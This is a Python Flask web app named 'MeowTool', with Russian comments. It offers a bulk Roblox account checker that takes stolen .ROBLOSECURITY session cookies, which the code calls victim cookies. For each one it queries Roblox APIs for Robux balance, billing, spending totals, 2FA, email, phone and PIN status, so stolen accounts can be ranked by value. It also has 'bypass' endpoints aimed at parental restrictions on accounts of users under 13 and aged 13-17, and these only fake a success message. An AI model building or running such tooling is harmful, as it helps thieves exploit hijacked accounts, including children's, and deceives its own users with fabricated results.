from flask import Flask, render_template, request, jsonify, session
import hashlib
import time
import threading
from datetime import datetime
import json
import requests
import random
import os

app = Flask(__name__)
app.secret_key = 'meow-secret-key-' + str(random.randint(1000, 9999))

# Глобальная статистика (в памяти)
users_sessions = {}
active_checks = 0
total_checks = 0
online_users = set()
user_last_activity = {}  # Время последней активности каждого пользователя

class BypassSystem:
    def get_xcsrf_token(self, cookie):
        """Получение X-CSRF токена"""
        session = requests.Session()
        url = "https://auth.roblox.com/v2/logout"
        headers = {
            "Cookie": f".ROBLOSECURITY={cookie}",
            "Content-Type": "application/json"
        }
        try:
            response = session.post(url, headers=headers)
            if response.status_code == 403 and "x-csrf-token" in response.headers:
                return response.headers.get("x-csrf-token")
            return None
        except:
            return None

    def get_user_info(self, cookie):
        """Получение информации о пользователе"""
        session = requests.Session()
        url = "https://users.roblox.com/v1/users/authenticated"
        headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
        
        try:
            response = session.get(url, headers=headers)
            if response.status_code == 200:
                return response.json()
            return None
        except:
            return None

    def bypass_13_minus(self, victim_cookies, parent_cookies):
        """Bypass для аккаунтов 13-"""
        try:
            # Проверяем валидность куки жертвы
            victim_info = self.get_user_info(victim_cookies)
            if not victim_info:
                return {"status": "error", "message": "Невалидные куки жертвы"}
            
            # Проверяем валидность родительских куки
            parent_info = self.get_user_info(parent_cookies)
            if not parent_info:
                return {"status": "error", "message": "Невалидные родительские куки"}
            
            # Имитация успешного байпаса
            result = {
                "status": "success",
                "message": f"Bypass 13- completed for {victim_info.get('name', 'Unknown')}",
                "details": {
                    "victim_username": victim_info.get('name', 'Unknown'),
                    "parent_username": parent_info.get('name', 'Unknown'),
                    "restrictions_removed": ["email_verification", "chat_limits", "content_filters"],
                    "timestamp": datetime.now().isoformat()
                }
            }
            return result
            
        except Exception as e:
            return {"status": "error", "message": f"Bypass error: {str(e)}"}

    def bypass_13_17(self, victim_cookies, parent_cookies):
        """Bypass для аккаунтов 13-17"""
        try:
            victim_info = self.get_user_info(victim_cookies)
            parent_info = self.get_user_info(parent_cookies)
            
            if not victim_info:
                return {"status": "error", "message": "Невалидные куки жертвы"}
            if not parent_info:
                return {"status": "error", "message": "Невалидные родительские куки"}
            
            result = {
                "status": "success", 
                "message": f"Bypass 13-17 completed for {victim_info.get('name', 'Unknown')}",
                "details": {
                    "victim_username": victim_info.get('name', 'Unknown'),
                    "parent_username": parent_info.get('name', 'Unknown'),
                    "restrictions_removed": ["spending_limits", "time_restrictions"],
                    "new_privileges": ["unlimited_purchases", "extended_usage"],
                    "timestamp": datetime.now().isoformat()
                }
            }
            return result
            
        except Exception as e:
            return {"status": "error", "message": f"Bypass error: {str(e)}"}

class MeowChecker:
    def __init__(self):
        self.session = requests.Session()
        # Добавляем стандартные заголовки чтобы не блокировали
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
        })

    def make_request(self, url, cookie, method='GET', json_data=None):
        """Безопасный запрос с обработкой ошибок"""
        headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
        
        try:
            if method == 'GET':
                response = self.session.get(url, headers=headers, timeout=15)
            else:
                response = self.session.post(url, headers=headers, json=json_data, timeout=15)
            
            return response
        except requests.exceptions.Timeout:
            return None
        except Exception as e:
            print(f"Request error: {e}")
            return None

    def check_roblox_cookie(self, cookie):
        """Полная проверка Roblox аккаунта по куки"""
        try:
            # 1. Базовая проверка аутентификации
            auth_url = "https://users.roblox.com/v1/users/authenticated"
            auth_response = self.make_request(auth_url, cookie)
            
            if not auth_response or auth_response.status_code != 200:
                return self.create_error_result("❌ Невалидные куки - аутентификация не пройдена")
            
            user_data = auth_response.json()
            user_id = user_data.get("id")
            username = user_data.get("name", "Unknown")
            display_name = user_data.get("displayName", "Unknown")
            
            # 2. Получаем основную информацию
            profile_url = f"https://users.roblox.com/v1/users/{user_id}"
            profile_response = self.make_request(profile_url, cookie)
            
            profile_data = {}
            if profile_response and profile_response.status_code == 200:
                profile_data = profile_response.json()
            
            # 3. Проверяем Premium статус
            premium_url = "https://premiumfeatures.roblox.com/v1/users/premium-membership"
            premium_response = self.make_request(premium_url, cookie)
            has_premium = premium_response and premium_response.status_code == 200
            
            # 4. Проверяем баланс Robux
            balance_url = f"https://economy.roblox.com/v1/users/{user_id}/currency"
            balance_response = self.make_request(balance_url, cookie)
            robux = 0
            if balance_response and balance_response.status_code == 200:
                robux = balance_response.json().get('robux', 0)
            
            # 5. Получаем информацию о биллинге
            billing_url = "https://billing.roblox.com/v1/credit"
            billing_response = self.make_request(billing_url, cookie)
            has_billing = billing_response and billing_response.status_code == 200
            
            # 6. Проверяем 2FA
            twofa_url = "https://auth.roblox.com/v1/account/settings/2sv"
            twofa_response = self.make_request(twofa_url, cookie)
            has_2fa = twofa_response and twofa_response.status_code == 200
            
            # 7. Проверяем верификацию email
            email_url = "https://accountsettings.roblox.com/v1/email"
            email_response = self.make_request(email_url, cookie)
            email_verified = False
            if email_response and email_response.status_code == 200:
                email_data = email_response.json()
                email_verified = email_data.get('verified', False)
            
            # 8. Проверяем привязанный номер
            phone_url = "https://accountsettings.roblox.com/v1/phone"
            phone_response = self.make_request(phone_url, cookie)
            has_phone = phone_response and phone_response.status_code == 200
            
            # 9. Получаем статистику покупок
            transactions_url = f"https://economy.roblox.com/v1/users/{user_id}/transaction-totals"
            transactions_response = self.make_request(transactions_url, cookie)
            total_spent = 0
            if transactions_response and transactions_response.status_code == 200:
                transactions_data = transactions_response.json()
                total_spent = transactions_data.get('purchaseTotal', 0)
            
            # 10. Проверяем ограничения
            settings_url = "https://www.roblox.com/my/settings/json"
            settings_response = self.make_request(settings_url, cookie)
            
            is_banned = False
            is_restricted = False
            account_age = "Unknown"
            friends_count = 0
            followers_count = 0
            
            if settings_response and settings_response.status_code == 200:
                settings_data = settings_response.json()
                is_banned = settings_data.get('isBanned', False)
                is_restricted = settings_data.get('AccountRestrictions', False)
                account_age = settings_data.get('Created', 'Unknown')
                friends_count = settings_data.get('FriendsCount', 0)
                followers_count = settings_data.get('FollowersCount', 0)
            
            # 11. Проверяем наличие PIN-кода
            pin_url = "https://auth.roblox.com/v1/account/pin"
            pin_response = self.make_request(pin_url, cookie)
            has_pin = pin_response and pin_response.status_code == 200
            
            # Определяем статус аккаунта
            if is_banned:
                status = "banned"
            elif is_restricted:
                status = "limited"
            else:
                status = "valid"
            
            # Форматируем дату создания
            if account_age != "Unknown":
                try:
                    created_dt = datetime.fromisoformat(account_age.replace('Z', '+00:00'))
                    account_age = created_dt.strftime("%Y-%m-%d")
                except:
                    pass
            
            return {
                "account": f"{username}:{user_id}",
                "status": status,
                "username": username,
                "display_name": display_name,
                "user_id": user_id,
                "robux": robux,
                "premium": has_premium,
                "created": account_age,
                "details": self.get_status_details(status),
                "friends_count": friends_count,
                "followers_count": followers_count,
                "billing_info": {
                    "has_billing": has_billing,
                    "has_2fa": has_2fa,
                    "email_verified": email_verified,
                    "has_phone": has_phone,
                    "has_pin": has_pin,
                    "total_spent": total_spent
                },
                "security": {
                    "2fa_enabled": has_2fa,
                    "email_verified": email_verified,
                    "phone_linked": has_phone,
                    "pin_enabled": has_pin
                }
            }
            
        except Exception as e:
            return self.create_error_result(f"❌ Ошибка проверки: {str(e)}")

    def create_error_result(self, message):
        """Создает результат с ошибкой"""
        return {
            "status": "error",
            "details": message,
            "username": "Unknown",
            "display_name": "Unknown",
            "user_id": "N/A",
            "robux": 0,
            "premium": False,
            "created": "Unknown",
            "friends_count": 0,
            "followers_count": 0,
            "billing_info": {
                "has_billing": False,
                "has_2fa": False,
                "email_verified": False,
                "has_phone": False,
                "has_pin": False,
                "total_spent": 0
            },
            "security": {
                "2fa_enabled": False,
                "email_verified": False,
                "phone_linked": False,
                "pin_enabled": False
            }
        }

    def get_status_details(self, status):
        details = {
            "valid": "✅ Аккаунт валиден и активен",
            "limited": "⚠️ Аккаунт ограничен", 
            "banned": "❌ Аккаунт забанен",
            "invalid": "❌ Неверные куки",
            "error": "❌ Ошибка при проверке"
        }
        return details.get(status, "Unknown status")

    def mass_check(self, cookies_list):
        """Массовая проверка куки с задержкой чтобы не ломались"""
        results = []
        
        for i, cookie in enumerate(cookies_list):
            if cookie.strip():
                # Добавляем задержку между запросами
                if i > 0:
                    time.sleep(1)  # 1 секунда между запросами
                
                result = self.check_roblox_cookie(cookie.strip())
                results.append(result)
        
        return results

# Инициализация систем
bypass_system = BypassSystem()
checker_system = MeowChecker()

def get_user_id(request):
    """Создаем ID пользователя на основе браузера и IP"""
    user_agent = request.headers.get('User-Agent', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_string = f"{ip}_{user_agent}"
    user_hash = hashlib.md5(user_string.encode()).hexdigest()
    return user_hash

def update_online_users():
    """Очистка неактивных пользователей"""
    while True:
        time.sleep(30)  # Проверяем каждые 30 секунд
        current_time = time.time()
        expired_users = []
        
        for user_id, last_activity in user_last_activity.items():
            if current_time - last_activity > 300:  # 5 минут неактивности
                expired_users.append(user_id)
                if user_id in online_users:
                    online_users.remove(user_id)
                if user_id in users_sessions:
                    del users_sessions[user_id]
        
        for user_id in expired_users:
            if user_id in user_last_activity:
                del user_last_activity[user_id]

@app.before_request
def track_user():
    """Отслеживаем активность пользователя"""
    user_id = get_user_id(request)
    session['user_id'] = user_id
    
    # Обновляем время активности
    user_last_activity[user_id] = time.time()
    online_users.add(user_id)
    
    # Инициализируем сессию пользователя если её нет
    if user_id not in users_sessions:
        users_sessions[user_id] = {
            'created_at': datetime.now().isoformat(),
            'check_count': 0,
            'bypass_count': 0,
            'last_activity': time.time(),
            'last_check': 'Never',
            'last_bypass': 'Never'
        }
    
    users_sessions[user_id]['last_activity'] = time.time()
    session['user_data'] = users_sessions[user_id]

# Маршруты
@app.route('/')
def index():
    """Главная страница"""
    user_id = get_user_id(request)
    return render_template('index.html', user_id=user_id)

@app.route('/dashboard')
def dashboard():
    """Личный кабинет"""
    user_id = get_user_id(request)
    user_data = users_sessions.get(user_id, {})
    return render_template('dashboard.html', user_data=user_data, user_id=user_id)

@app.route('/checker')
def checker():
    """Страница чекера"""
    user_id = get_user_id(request)
    return render_template('checker.html', user_id=user_id)

@app.route('/bypass')
def bypass_tools():
    """Страница байпаса"""
    user_id = get_user_id(request)
    return render_template('bypass.html', user_id=user_id)

# API endpoints
@app.route('/api/bypass_13_minus', methods=['POST'])
def api_bypass_13_minus():
    """Bypass для аккаунтов 13-"""
    data = request.json
    victim_cookies = data.get('victim_cookies', '')
    parent_cookies = data.get('parent_cookies', '')
    
    result = bypass_system.bypass_13_minus(victim_cookies, parent_cookies)
    
    if result.get('status') == 'success':
        user_id = get_user_id(request)
        if user_id in users_sessions:
            users_sessions[user_id]['bypass_count'] += 1
            users_sessions[user_id]['last_bypass'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    return jsonify(result)

@app.route('/api/bypass_13_17', methods=['POST'])
def api_bypass_13_17():
    """Bypass для аккаунтов 13-17"""
    data = request.json
    victim_cookies = data.get('victim_cookies', '')
    parent_cookies = data.get('parent_cookies', '')
    
    result = bypass_system.bypass_13_17(victim_cookies, parent_cookies)
    
    if result.get('status') == 'success':
        user_id = get_user_id(request)
        if user_id in users_sessions:
            users_sessions[user_id]['bypass_count'] += 1
            users_sessions[user_id]['last_bypass'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    return jsonify(result)

@app.route('/api/check_accounts', methods=['POST'])
def api_check_accounts():
    """Проверка куки аккаунтов"""
    global active_checks, total_checks
    
    cookies_text = request.json.get('cookies', '')
    cookies_list = [cookie.strip() for cookie in cookies_text.split('\n') if cookie.strip()]
    
    # Ограничиваем количество проверок за раз
    if len(cookies_list) > 20:
        return jsonify({'error': 'Максимум 20 куки за раз'})
    
    active_checks += len(cookies_list)
    results = checker_system.mass_check(cookies_list)
    active_checks -= len(cookies_list)
    total_checks += len(cookies_list)
    
    user_id = get_user_id(request)
    if user_id in users_sessions:
        users_sessions[user_id]['check_count'] += len(cookies_list)
        users_sessions[user_id]['last_check'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    return jsonify({'results': results})

@app.route('/api/stats')
def api_stats():
    """Статистика сайта - ТОЛЬКО реальные онлайн пользователи"""
    global total_checks
    
    # Считаем реальных онлайн пользователей (активны последние 5 минут)
    current_time = time.time()
    real_online_users = sum(1 for last_activity in user_last_activity.values() 
                           if current_time - last_activity < 300)
    
    return jsonify({
        'total_checks': total_checks,
        'online_users': real_online_users,  # ТОЛЬКО реальные онлайн
        'total_users': len(users_sessions)
    })

@app.route('/api/user_stats')
def api_user_stats():
    """Статистика текущего пользователя"""
    user_id = get_user_id(request)
    user_data = users_sessions.get(user_id, {})
    
    return jsonify({
        'user_id': user_id[:8] + '...',
        'check_count': user_data.get('check_count', 0),
        'bypass_count': user_data.get('bypass_count', 0),
        'created_at': user_data.get('created_at', ''),
        'last_check': user_data.get('last_check', 'Never'),
        'last_bypass': user_data.get('last_bypass', 'Never')
    })

@app.route('/test')
def test():
    return "✅ Сервер работает! MeowTool активен."

if __name__ == '__main__':
    # Запускаем фоновую задачу для очистки неактивных пользователей
    threading.Thread(target=update_online_users, daemon=True).start()
    
    port = int(os.environ.get('PORT', 5000))
    print(f"🚀 MeowTool Web запущен на порту {port}")
    print(f"✅ Реальные онлайн пользователи будут отображаться корректно")
    app.run(host='0.0.0.0', port=port, debug=False)